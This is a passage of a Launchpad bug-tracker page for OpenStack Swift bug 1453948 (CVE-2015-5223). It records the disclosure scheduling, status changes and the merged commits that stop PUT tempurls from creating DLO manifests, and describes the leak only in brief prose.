    <div class="comment-text editable-message-text" itemprop="commentText"><p>The impact description in comment #22 looks fine, though I&#x27;d say &quot;all Swift setups&quot; rather than &quot;all Swift setup&quot; (minor grammar nit).</p>
<p>I&#x27;m good with the proposed Tuesday, August 25 disclosure, since that gives ample time for us to notify downstream stakeholders. As a reminder, this is intended to cover bugs 1453948 and 1449212.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The impact description in comment #22 looks fine, though I'd say "all Swift setups" rather than "all Swift setup" (minor grammar nit).

I'm good with the proposed Tuesday, August 25 disclosure, since that gives ample time for us to notify downstream stakeholders. As a reminder, this is intended to cover bugs 1453948 and 1449212.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-19T20:26:13.515298+00:00" title="2015-08-19 20:26:13 UTC">on 2015-08-19</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>looks good</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">looks good</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2015-08-19 20:29:04 UTC" datetime="2015-08-19T20:29:04.087230+00:00">on 2015-08-19</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Triaged &#8594; In Progress
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2015-08-19 21:12:27 UTC" datetime="2015-08-19T21:12:27.546590+00:00">on 2015-08-19</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - all PUT tempurls leak existence via DLO manifest attack<br />+ all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-20T19:11:02.483262+00:00" title="2015-08-20 19:11:02 UTC">on 2015-08-20</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/26">
                <strong>Re: all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Disclosure date (extended by one day):<br />
2015-08-26, 1500UTC</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Disclosure date (extended by one day):
2015-08-26, 1500UTC</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Committed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2015-08-26 15:00:54 UTC" datetime="2015-08-26T15:00:54.960989+00:00">on 2015-08-26</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-26T15:01:00.573053+00:00" title="2015-08-26 15:01:00 UTC">on 2015-08-26</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/27">
                <strong>Fix proposed to swift (stable/kilo)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: stable/kilo<br />
Review: <a rel="nofollow" href="https://review.openstack.org/217254">https:/<wbr />/review.<wbr />openstack.<wbr />org/217254</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/217254</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-26T15:34:52.060154+00:00" title="2015-08-26 15:34:52 UTC">on 2015-08-26</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/28">
                <strong>Related fix proposed to swift (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: master<br />
Review: <a rel="nofollow" href="https://review.openstack.org/217273">https:/<wbr />/review.<wbr />openstack.<wbr />org/217273</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: master
Review: https://review.openstack.org/217273</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2015-08-26 15:40:40 UTC" datetime="2015-08-26T15:40:40.378539+00:00">on 2015-08-26</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)<br />+ [OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack<br />+ (CVE-2015-5223)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-27T09:32:47.420123+00:00" title="2015-08-27 09:32:47 UTC">on 2015-08-27</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/29">
                <strong>Fix merged to swift (stable/juno)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/217253">https:/<wbr />/review.<wbr />openstack.<wbr />org/217253</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/swift/commit/?id=0694e1911d10a18075ff99462c96781372422b2c">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />swift/commit/<wbr />?id=0694e1911d1<wbr />0a18075ff99462c<wbr />96781372422b2c</a><br />
Submitter: Jenkins<br />
Branch:    stable/juno</p>
<p>commit 0694e1911d10a18<wbr />075ff99462c9678<wbr />1372422b2c<br />
Author: Clay Gerrard &lt;email address hidden&gt;<br />
Date:   Thu Jul 23 22:36:21 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Disallow unsafe tempurl operations to point to unauthorized data</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Do not allow PUT tempurls to create pointers to other data. Specifically<br />
&nbsp;&nbsp;&nbsp;&nbsp;disallow the creation of DLO object manifests by returning an error if a<br />
&nbsp;&nbsp;&nbsp;&nbsp;non-safe tempurl request includes an X-Object-Manifest header regardless of<br />
&nbsp;&nbsp;&nbsp;&nbsp;the value of the header.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This prevents discoverability attacks which can use any PUT tempurl to probe<br />
&nbsp;&nbsp;&nbsp;&nbsp;for private data by creating a DLO object manifest and then using the PUT<br />
&nbsp;&nbsp;&nbsp;&nbsp;tempurl to head the object which would 404 if the prefix does not match any<br />
&nbsp;&nbsp;&nbsp;&nbsp;object data or form a valid DLO HEAD response if it does.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This also prevents a tricky and potentially unexpected consequence of PUT<br />
&nbsp;&nbsp;&nbsp;&nbsp;tempurls which would make it unsafe to allow a user to download objects<br />
&nbsp;&nbsp;&nbsp;&nbsp;created by tempurl (even if they just created them) because the result of<br />
&nbsp;&nbsp;&nbsp;&nbsp;reading the object created via tempurl may not be the data which was uploaded.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;[CVE-2015-5223]</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Co-Authored-By: Kota Tsuyuzaki &lt;email address hidden&gt;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: 1453948</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I91161dfb0f089c<wbr />3990aca1b4255b5<wbr />20299ef73c8</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/217253
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=0694e1911d10a18075ff99462c96781372422b2c
Submitter: Jenkins
Branch:    stable/juno

commit 0694e1911d10a18075ff99462c96781372422b2c
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 23 22:36:21 2015 -0700

    Disallow unsafe tempurl operations to point to unauthorized data
    
    Do not allow PUT tempurls to create pointers to other data. Specifically
    disallow the creation of DLO object manifests by returning an error if a
    non-safe tempurl request includes an X-Object-Manifest header regardless of
    the value of the header.
    
    This prevents discoverability attacks which can use any PUT tempurl to probe
    for private data by creating a DLO object manifest and then using the PUT
    tempurl to head the object which would 404 if the prefix does not match any
    object data or form a valid DLO HEAD response if it does.
    
    This also prevents a tricky and potentially unexpected consequence of PUT
    tempurls which would make it unsafe to allow a user to download objects
    created by tempurl (even if they just created them) because the result of
    reading the object created via tempurl may not be the data which was uploaded.
    
    [CVE-2015-5223]
    
    Co-Authored-By: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
    
    Closes-Bug: 1453948
    
    Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-stable-juno
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-27T10:26:32.861201+00:00" title="2015-08-27 10:26:32 UTC">on 2015-08-27</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/30">
                <strong>Fix merged to swift (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/217259">https:/<wbr />/review.<wbr />openstack.<wbr />org/217259</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/swift/commit/?id=10b2939b433a4a79b4f7b97640b3d208cacfeffb">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />swift/commit/<wbr />?id=10b2939b433<wbr />a4a79b4f7b97640<wbr />b3d208cacfeffb</a><br />
Submitter: Jenkins<br />
Branch:    master</p>
<p>commit 10b2939b433a4a7<wbr />9b4f7b97640b3d2<wbr />08cacfeffb<br />
Author: Clay Gerrard &lt;email address hidden&gt;<br />
Date:   Thu Jul 23 22:36:21 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Disallow unsafe tempurl operations to point to unauthorized data</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Do not allow PUT tempurls to create pointers to other data. Specifically<br />
&nbsp;&nbsp;&nbsp;&nbsp;disallow the creation of DLO object manifests by returning an error if a<br />
&nbsp;&nbsp;&nbsp;&nbsp;non-safe tempurl request includes an X-Object-Manifest header regardless of<br />
&nbsp;&nbsp;&nbsp;&nbsp;the value of the header.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This prevents discoverability attacks which can use any PUT tempurl to probe<br />
&nbsp;&nbsp;&nbsp;&nbsp;for private data by creating a DLO object manifest and then using the PUT<br />
&nbsp;&nbsp;&nbsp;&nbsp;tempurl to head the object which would 404 if the prefix does not match any<br />
&nbsp;&nbsp;&nbsp;&nbsp;object data or form a valid DLO HEAD response if it does.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This also prevents a tricky and potentially unexpected consequence of PUT<br />
&nbsp;&nbsp;&nbsp;&nbsp;tempurls which would make it unsafe to allow a user to download objects<br />
&nbsp;&nbsp;&nbsp;&nbsp;created by tempurl (even if they just created them) because the result of<br />
&nbsp;&nbsp;&nbsp;&nbsp;reading the object created via tempurl may not be the data which was uploaded.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;[CVE-2015-5223]</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Co-Authored-By: Kota Tsuyuzaki &lt;email address hidden&gt;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I11e68830009d3f<wbr />6bff44ae4011a41<wbr />b67139146f6<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: 1453948</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/217259
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=10b2939b433a4a79b4f7b97640b3d208cacfeffb
Submitter: Jenkins
Branch:    master

commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 23 22:36:21 2015 -0700

    Disallow unsafe tempurl operations to point to unauthorized data
    
    Do not allow PUT tempurls to create pointers to other data. Specifically
    disallow the creation of DLO object manifests by returning an error if a
    non-safe tempurl request includes an X-Object-Manifest header regardless of
    the value of the header.
    
    This prevents discoverability attacks which can use any PUT tempurl to probe
    for private data by creating a DLO object manifest and then using the PUT
    tempurl to head the object which would 404 if the prefix does not match any
    object data or form a valid DLO HEAD response if it does.
    
    This also prevents a tricky and potentially unexpected consequence of PUT
    tempurls which would make it unsafe to allow a user to download objects
    created by tempurl (even if they just created them) because the result of
    reading the object created via tempurl may not be the data which was uploaded.
    
    [CVE-2015-5223]
    
    Co-Authored-By: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
    
    Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
    Closes-Bug: 1453948
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in swift: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Committed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-27T12:44:16.066449+00:00" title="2015-08-27 12:44:16 UTC">on 2015-08-27</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/31">
                <strong>Fix merged to swift (stable/kilo)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/217254">https:/<wbr />/review.<wbr />openstack.<wbr />org/217254</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/swift/commit/?id=410778b86a49702f80b734bdbf2480b86db342e2">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />swift/commit/<wbr />?id=410778b86a4<wbr />9702f80b734bdbf<wbr />2480b86db342e2</a><br />
Submitter: Jenkins<br />
Branch:    stable/kilo</p>
<p>commit 410778b86a49702<wbr />f80b734bdbf2480<wbr />b86db342e2<br />
Author: Clay Gerrard &lt;email address hidden&gt;<br />
Date:   Thu Jul 23 22:36:21 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Disallow unsafe tempurl operations to point to unauthorized data</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Do not allow PUT tempurls to create pointers to other data. Specifically<br />
&nbsp;&nbsp;&nbsp;&nbsp;disallow the creation of DLO object manifests by returning an error if a<br />
&nbsp;&nbsp;&nbsp;&nbsp;non-safe tempurl request includes an X-Object-Manifest header regardless of<br />
&nbsp;&nbsp;&nbsp;&nbsp;the value of the header.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This prevents discoverability attacks which can use any PUT tempurl to probe<br />
&nbsp;&nbsp;&nbsp;&nbsp;for private data by creating a DLO object manifest and then using the PUT<br />
&nbsp;&nbsp;&nbsp;&nbsp;tempurl to head the object which would 404 if the prefix does not match any<br />
&nbsp;&nbsp;&nbsp;&nbsp;object data or form a valid DLO HEAD response if it does.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This also prevents a tricky and potentially unexpected consequence of PUT<br />
&nbsp;&nbsp;&nbsp;&nbsp;tempurls which would make it unsafe to allow a user to download objects<br />
&nbsp;&nbsp;&nbsp;&nbsp;created by tempurl (even if they just created them) because the result of<br />
&nbsp;&nbsp;&nbsp;&nbsp;reading the object created via tempurl may not be the data which was uploaded.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;[CVE-2015-5223]</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Co-Authored-By: Kota Tsuyuzaki &lt;email address hidden&gt;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: 1453948</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I91161dfb0f089c<wbr />3990aca1b4255b5<wbr />20299ef73c8</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/217254
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=410778b86a49702f80b734bdbf2480b86db342e2
Submitter: Jenkins
Branch:    stable/kilo

commit 410778b86a49702f80b734bdbf2480b86db342e2
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 23 22:36:21 2015 -0700

    Disallow unsafe tempurl operations to point to unauthorized data
    
    Do not allow PUT tempurls to create pointers to other data. Specifically
    disallow the creation of DLO object manifests by returning an error if a
    non-safe tempurl request includes an X-Object-Manifest header regardless of
    the value of the header.
    
    This prevents discoverability attacks which can use any PUT tempurl to probe
    for private data by creating a DLO object manifest and then using the PUT
    tempurl to head the object which would 404 if the prefix does not match any
    object data or form a valid DLO HEAD response if it does.
    
    This also prevents a tricky and potentially unexpected consequence of PUT
    tempurls which would make it unsafe to allow a user to download objects
    created by tempurl (even if they just created them) because the result of
    reading the object created via tempurl may not be the data which was uploaded.
    
    [CVE-2015-5223]
    
    Co-Authored-By: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
    
    Closes-Bug: 1453948
    
    Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-stable-kilo
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~ttx" class="sprite person">Thierry Carrez (ttx)</a>
    
    <time title="2015-09-01 12:25:22 UTC" datetime="2015-09-01T12:25:22.777114+00:00">on 2015-09-01</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in swift: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>milestone</b>:
      </td>
      <td>
        none &#8594; 2.4.0
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
